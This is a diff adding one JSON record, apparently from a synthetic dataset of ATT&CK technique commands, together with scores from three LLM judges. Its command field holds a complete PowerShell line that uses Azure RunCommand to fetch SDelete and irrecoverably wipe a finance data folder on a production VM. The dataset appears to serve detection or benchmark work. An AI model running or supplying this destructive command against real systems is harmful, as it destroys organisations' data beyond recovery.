@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1485",
+  "platform": "IaaS",
+  "shell": "PowerShell",
+  "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG-Prod' -Name 'WinVM-Finance' -CommandId 'RunPowerShellScript' -ScriptString \"Set-Location $env:TEMP; Invoke-WebRequest https://download.sysinternals.com/files/SDelete.zip -OutFile sdelete.zip; Expand-Archive -Path sdelete.zip -DestinationPath . -Force; & .\\sdelete.exe -accepteula -s -p 3 -q 'C:\\Data\\Finance'\"",
+  "explanation": "Downloads Microsoft Sysinternals SDelete and securely overwrites then deletes all data within C:\\Data\\Finance on a Windows VM.",
+  "rationale_steps": [
+    "Obtain a secure deletion tool (SDelete) on the target VM.",
+    "Recursively overwrite targeted files with multiple passes and remove them to prevent recovery."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1485-28d85ee8-2db4d647",
+  "source_prompt_hash": "28d85ee8",
+  "timestamp_utc": "2025-09-30T08:03:27.709996Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper PowerShell syntax, balanced quotes, valid parameter names, and correct use of nested commands.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1485 Data Destruction technique by downloading SDelete (a legitimate secure deletion tool) and using it with appropriate parameters to securely wipe financial data with 3 passes on a production VM.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T02:43:35.670463Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with correct cmdlet usage, proper parameter assignments, balanced quoting, valid command separators, and accurate flag formats for all embedded commands.",
+        "semantic_score": 3,
+        "semantic_justification": "While the chosen tool (SDelete) and its arguments are perfectly aligned with secure data destruction (T1485), the command's operational feasibility is severely compromised by the stated 'Privilege: None' context, as SDelete typically requires administrative privileges to securely wipe a system-level directory like 'C:\\Data\\Finance'.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:43:55.951306Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell cmdlet and inner script are well-formed with balanced quoting, valid parameters, and proper separators.",
+        "semantic_score": 4,
+        "semantic_justification": "It appropriately uses Azure RunCommand to download and execute Sysinternals SDelete for recursive secure deletion of C:\\Data\\Finance, though $env:TEMP will be interpolated locally (not remotely) which is a minor operational caveat.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:44:19.638665Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
